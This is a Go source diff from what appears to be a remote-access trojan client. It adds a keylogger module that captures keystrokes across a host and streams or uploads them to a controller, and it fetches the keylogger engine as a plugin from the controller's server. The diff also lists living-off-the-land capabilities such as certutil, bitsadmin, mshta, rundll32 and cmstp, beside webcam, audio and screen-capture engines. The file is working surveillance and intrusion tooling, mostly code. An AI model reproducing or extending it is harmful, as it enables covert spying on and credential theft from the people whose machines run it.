@@ -12,26 +12,26 @@ import (
 	"sync"
 	"time"
 
-	appvncengine "github.com/rootbay/tenvy-client/internal/plugins/engines/appvnc"
-	audioengine "github.com/rootbay/tenvy-client/internal/plugins/engines/audio"
-	keyloggerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/keylogger"
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
-	webcamengine "github.com/rootbay/tenvy-client/internal/plugins/engines/webcam"
 	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
 	environmentmgr "github.com/rootbay/tenvy-client/internal/modules/management/environment"
-	filemanagerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/filemanager"
 	lotl "github.com/rootbay/tenvy-client/internal/modules/management/lotl"
-	registryengine "github.com/rootbay/tenvy-client/internal/plugins/engines/registry"
-	startupengine "github.com/rootbay/tenvy-client/internal/plugins/engines/startup"
-	taskmanagerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/taskmanager"
-	tcpconnectionsengine "github.com/rootbay/tenvy-client/internal/plugins/engines/tcpconnections"
 	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
 	geolocationmgr "github.com/rootbay/tenvy-client/internal/modules/misc/geolocation"
-	triggerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/trigger"
 	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
 	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
 	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
 	"github.com/rootbay/tenvy-client/internal/plugins"
+	appvncengine "github.com/rootbay/tenvy-client/internal/plugins/engines/appvnc"
+	audioengine "github.com/rootbay/tenvy-client/internal/plugins/engines/audio"
+	filemanagerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/filemanager"
+	keyloggerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/keylogger"
+	registryengine "github.com/rootbay/tenvy-client/internal/plugins/engines/registry"
+	startupengine "github.com/rootbay/tenvy-client/internal/plugins/engines/startup"
+	taskmanagerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/taskmanager"
+	tcpconnectionsengine "github.com/rootbay/tenvy-client/internal/plugins/engines/tcpconnections"
+	triggerengine "github.com/rootbay/tenvy-client/internal/plugins/engines/trigger"
+	webcamengine "github.com/rootbay/tenvy-client/internal/plugins/engines/webcam"
 	"github.com/rootbay/tenvy-client/internal/protocol"
 	manifest "github.com/rootbay/tenvy-client/shared/pluginmanifest"
 )
@@ -627,7 +627,7 @@ func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime Config, cfg 
 }
 
 var (
-	lotlModuleBaseCapabilities            = []string{"lotl.certutil", "lotl.bitsadmin", "lotl.wevtutil", "lotl.netsh", "lotl.sc", "lotl.taskkill", "lotl.powershell", "lotl.mshta", "lotl.rundll32", "lotl.regsvr32", "lotl.wmic", "lotl.whoami", "lotl.net", "lotl.msiexec", "lotl.cmstp"}
+	lotlModuleBaseCapabilities           = []string{"lotl.certutil", "lotl.bitsadmin", "lotl.wevtutil", "lotl.netsh", "lotl.sc", "lotl.taskkill", "lotl.powershell", "lotl.mshta", "lotl.rundll32", "lotl.regsvr32", "lotl.wmic", "lotl.whoami", "lotl.net", "lotl.msiexec", "lotl.cmstp"}
 	audioModuleBaseCapabilities          = []string{"audio.capture", "audio.inject"}
 	keyloggerModuleBaseCapabilities      = []string{"keylogger.stream", "keylogger.batch"}
 	webcamModuleBaseCapabilities         = []string{"webcam.enumerate", "webcam.stream"}
@@ -854,6 +854,201 @@ type keyloggerModule struct {
 	requiredVersion string
 }
 
+func newKeyloggerModule() *keyloggerModule {
+	return &keyloggerModule{
+		BaseModule: *NewBaseModule("keylogger", keyloggerModuleBaseCapabilities),
+		factory:    defaultKeyloggerEngineFactory,
+	}
+}
+
+func (m *keyloggerModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "keylogger",
+		Title:       "Keylogger",
+		Description: "Capture keystrokes and system events across the host workstation.",
+		Commands:    []string{"keylogger"},
+		Capabilities: []ModuleCapability{
+			{
+				ID:          "keylogger.stream",
+				Name:        "keylogger.stream",
+				Description: "Stream keystrokes in real-time to the controller.",
+			},
+			{
+				ID:          "keylogger.batch",
+				Name:        "keylogger.batch",
+				Description: "Capture and upload keystrokes in batch mode.",
+			},
+		},
+	}
+}
+
+func (m *keyloggerModule) ID() string {
+	return "keylogger"
+}
+
+func (m *keyloggerModule) Init(ctx context.Context, cfg Config) error {
+	m.BaseModule.Init(ctx, cfg)
+	return m.configure(ctx, cfg)
+}
+
+func (m *keyloggerModule) UpdateConfig(cfg Config) error {
+	m.BaseModule.UpdateConfig(cfg)
+	return m.configure(context.Background(), cfg)
+}
+
+func (m *keyloggerModule) configure(ctx context.Context, runtime Config) error {
+	var requestTimeout time.Duration
+	if runtime.HTTPClient != nil {
+		requestTimeout = runtime.HTTPClient.Timeout
+	}
+	cfg := keyloggerengine.Config{
+		AgentID:        runtime.AgentID,
+		BaseURL:        runtime.BaseURL,
+		AuthKey:        runtime.AuthKey,
+		Client:         runtime.HTTPClient,
+		Logger:         runtime.Logger,
+		UserAgent:      runtime.UserAgent,
+		RequestTimeout: requestTimeout,
+	}
+
+	m.mu.Lock()
+	factory := m.factory
+	engine := m.engine
+	version := strings.TrimSpace(m.requiredVersion)
+	m.mu.Unlock()
+
+	if engine == nil {
+		if factory == nil {
+			factory = defaultKeyloggerEngineFactory
+		}
+		created, stagedVersion, err := factory(ctx, runtime, cfg)
+		if err != nil {
+			return err
+		}
+		stagedVersion = strings.TrimSpace(stagedVersion)
+		if stagedVersion != "" {
+			cfg.RequestTimeout = requestTimeout
+		}
+		if err := created.Configure(cfg); err != nil {
+			return err
+		}
+		m.mu.Lock()
+		m.engine = created
+		m.engineConfig = cfg
+		if stagedVersion != "" {
+			m.requiredVersion = stagedVersion
+		}
+		m.mu.Unlock()
+		return nil
+	}
+
+	if err := engine.Configure(cfg); err != nil {
+		return err
+	}
+	m.mu.Lock()
+	m.engineConfig = cfg
+	m.mu.Unlock()
+	return nil
+}
+
+func (m *keyloggerModule) Handle(ctx context.Context, cmd protocol.Command) error {
+	engine := m.currentEngine()
+	if engine == nil {
+		return WrapCommandResult(protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "keylogger subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		})
+	}
+
+	if len(cmd.Payload) > 0 {
+		var payload keyloggerengine.CommandPayload
+		if err := json.Unmarshal(cmd.Payload, &payload); err == nil {
+			action := strings.TrimSpace(strings.ToLower(payload.Action))
+			switch action {
+			case "start":
+				if err := m.HandleCapabilityCheck(cmd, "keylogger.stream", "keylogger.batch"); err != nil {
+					return err
+				}
+			}
+		}
+	}
+
+	return WrapCommandResult(engine.HandleCommand(ctx, cmd))
+}
+
+func (m *keyloggerModule) Shutdown(context.Context) error {
+	engine := m.currentEngine()
+	if engine != nil {
+		engine.Shutdown()
+	}
+	return nil
+}
+
+func (m *keyloggerModule) currentEngine() keyloggerengine.Engine {
+	m.mu.Lock()
+	defer m.mu.Unlock()
+	return m.engine
+}
+
+func defaultKeyloggerEngineFactory(ctx context.Context, runtime Config, cfg keyloggerengine.Config) (keyloggerengine.Engine, string, error) {
+	manager := runtime.Plugins
+	client := runtime.HTTPClient
+	baseURL := strings.TrimSpace(runtime.BaseURL)
+	agentID := strings.TrimSpace(runtime.AgentID)
+
+	fallback := func() (keyloggerengine.Engine, string, error) {
+		engine := keyloggerengine.NewKeyloggerEngine(cfg)
+		return engine, "", nil
+	}
+
+	if manager == nil || client == nil || baseURL == "" || agentID == "" {
+		return fallback()
+	}
+
+	descriptor, ok := runtime.PluginManifests["keylogger-engine"]
+	if !ok {
+		return fallback()
+	}
+
+	stageCtx := ctx
+	if stageCtx == nil {
+		stageCtx = context.Background()
+	}
+
+	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
+	defer cancel()
+
+	var metadata protocol.AgentMetadata
+	if runtime.Provider != nil {
+		metadata = runtime.Provider.AgentMetadata()
+	}
+	agentVersion := strings.TrimSpace(runtime.BuildVersion)
+	if agentVersion == "" {
+		agentVersion = strings.TrimSpace(metadata.Version)
+	}
+	facts := manifest.RuntimeFacts{
+		Platform:       metadata.OS,
+		Architecture:   metadata.Architecture,
+		AgentVersion:   agentVersion,
+		EnabledModules: append([]string(nil), runtime.ActiveModules...),
+	}
+
+	result, err := plugins.StagePlugin(stageCtx, manager, client, baseURL, agentID, runtime.AuthKey, runtime.UserAgent, facts, descriptor, "keylogger-engine")
+	if err != nil {
+		if runtime.Logger != nil {
+			runtime.Logger.Printf("keylogger: engine staging failed: %v", err)
+		}
+		return fallback()
+	}
+
+	version := strings.TrimSpace(result.Manifest.Version)
+	engine := keyloggerengine.NewManagedKeyloggerEngine(result.EntryPath, version, runtime.Logger)
+	return engine, version, nil
+}
+
+
 type webcamEngineFactory func(context.Context, Config, webcamengine.Config) (webcamengine.Engine, string, error)
 
 type webcamModule struct {
@@ -934,7 +1129,7 @@ func (m *webcamModule) configure(ctx context.Context, runtime Config) error {
 		}
 		stagedVersion = strings.TrimSpace(stagedVersion)
 		if stagedVersion != "" {
-			cfg.RequestTimeout = requestTimeout // ensure it's set
+			cfg.RequestTimeout = requestTimeout
 		}
 		if err := created.Configure(cfg); err != nil {
 			return err
@@ -1287,7 +1482,6 @@ func defaultAudioEngineFactory(ctx context.Context, runtime Config, cfg audioeng
 	engine := audioengine.NewManagedAudioEngine(result.EntryPath, version, runtime.Logger)
 	return engine, version, nil
 }
-
 
 type clipboardModule struct {
 	manager    *clipboard.Manager
